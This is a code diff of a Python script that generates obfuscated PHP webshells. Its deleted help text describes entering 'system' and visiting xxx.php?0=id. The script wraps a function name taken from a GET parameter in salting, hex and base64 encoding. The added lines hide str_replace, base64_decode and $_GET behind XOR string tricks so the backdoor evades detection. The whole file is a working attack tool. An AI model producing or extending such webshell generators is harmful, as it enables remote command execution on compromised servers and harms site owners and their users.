@@ -1,7 +1,7 @@
 import base64
 import random
 import string
-
+import sys
 
 def RandomNumber():
     n1=random.randint(0,100)
@@ -30,15 +30,11 @@ def ConvertToHex(s):
     return hex_representation, selected_char
 
 
-
 def FuncConfuse(ss:str):
     payload=''
     prefix='<?php function/**/r($a){'
     a,b,c=RandomNumber()
-    suffix=f"}}r($_GET[({a})!=({b}{['-','+'][random.randint(0,1)]}{c})]);?>"
-
-    # @str_replace("cas","t",'sy'."\x73c".bASe64_deCOde('YXNlbQ=='))
-    # @str_replace(      "cas","t",'sy'."\x73c"     .      bASe64_deCOde('YXNlbQ==')   )
+    suffix=f"}}r(${{('!o'^'~(').('iz'^',.')}}[({a})!=({b}{['-','+'][random.randint(0,1)]}{c})]);?>"
 
     # 獲取長度為4的隨機字串
     salt=GenerateRandomString(4)
@@ -54,7 +50,6 @@ def FuncConfuse(ss:str):
     str1=ss_salt[:rnd_len]
     str2=ss_salt[rnd_len::]
 
-
     # str1 的處理
     rnd_len_str1=random.randint(1,len(str1)-2)
     str1_left =str1[:rnd_len_str1]
@@ -68,20 +63,16 @@ def FuncConfuse(ss:str):
         TmpKeyToHex,TmpKeyToHexChar=ConvertToHex(str1_right)
         str1_right=str1_right.replace(TmpKeyToHexChar,TmpKeyToHex)
 
-
-
     # str2的處理
-    # 將加料2做base64
     str2_base64=base64.b64encode(str2.encode('ascii')).decode('ascii')
+    return f"{prefix}@((',4K!DDS'^'_@9~6!#').('2VEW'^'^7&2'))('{salt}','{RndLenSaltkey}',\"{str1_left}\".\"{str1_right}\".(('9jfWW'^'[+52a').('OzQA9'^'{{%5$z').('^Ik'^'1-.'))('{str2_base64}'))($a);{suffix}"
 
-    return f"{prefix}@str_replace('{salt}','{RndLenSaltkey}',\"{str1_left}\".\"{str1_right}\".base64_decode('{str2_base64}'))($a);{suffix}"
 
-
-def main():
-    print('example:')
-    print("\tInput 'system', can return a php code webshell")
-    print('\tOn website use xxx.php?0=id')
-    func_name=input('function name: ')
+def main(argv):
+    func_name=input('function name: ') if len(argv) < 2 else argv[1]
+    if len(func_name)<4:
+        print('function name length <4  :-(')
+        exit(0)
     while True:
         try:
             print(FuncConfuse(func_name))
@@ -91,4 +82,4 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    main(sys.argv)
